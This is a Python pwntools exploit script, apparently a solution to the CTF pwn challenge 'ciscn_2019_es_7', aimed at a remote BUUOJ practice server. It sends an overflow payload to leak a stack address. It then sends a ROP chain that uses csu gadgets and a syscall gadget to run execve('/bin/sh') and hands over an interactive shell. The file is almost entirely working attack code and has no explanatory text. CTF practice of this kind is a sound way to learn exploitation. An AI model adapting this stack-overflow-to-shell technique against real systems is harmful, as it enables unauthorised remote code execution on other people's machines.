from pwn import*
context.log_level = 'debug'

#sh = process('./ciscn_2019_es_7')
sh = remote('node3.buuoj.cn',25790)

payload = '/bin/sh\x00'.ljust(0x10,'A')
payload += p64(0x000040051D) #jmp to start
payload += 'A'*6 + ':'
sh.sendline(payload)
sh.recvuntil('AAA:\n')
stack_addr = u64(sh.recv(6).ljust(8,'\x00')) - 0x1ff58
print hex(stack_addr)
bin_sh_addr = stack_addr + 0x1fe20

#execv(rdi='/bin/sh'_Addr,rsi=0,rdx=0)rax=59
pop_rdi_ret = 0x00000000004005a3
pop_rsi_r15_ret = 0x00000000004005a1
mov_rax_3bh = 0x04004E2
ret = 0x00000000004003a9
syscall = 0x0000000000400501

#rbx=0,rbp=1,r12=ret,r13=0,r14=0,r15=0
payload1 = '/bin/sh'.ljust(0x8,'\x00')
payload1 += p64(ret)
payload1 += p64(0x40059a)
payload1 += p64(0)
payload1 += p64(1)
payload1 += p64(bin_sh_addr+8)
payload1 += p64(0)
payload1 += p64(0)
payload1 += p64(0)
payload1 += p64(0x400580)
payload1 += p64(0)*7 #for rsp increasing
payload1 += p64(pop_rdi_ret) + p64(bin_sh_addr)
payload1 += p64(mov_rax_3bh)
payload1 += p64(syscall)

#gdb.attach(sh)
sh.sendline(payload1)

sh.interactive()



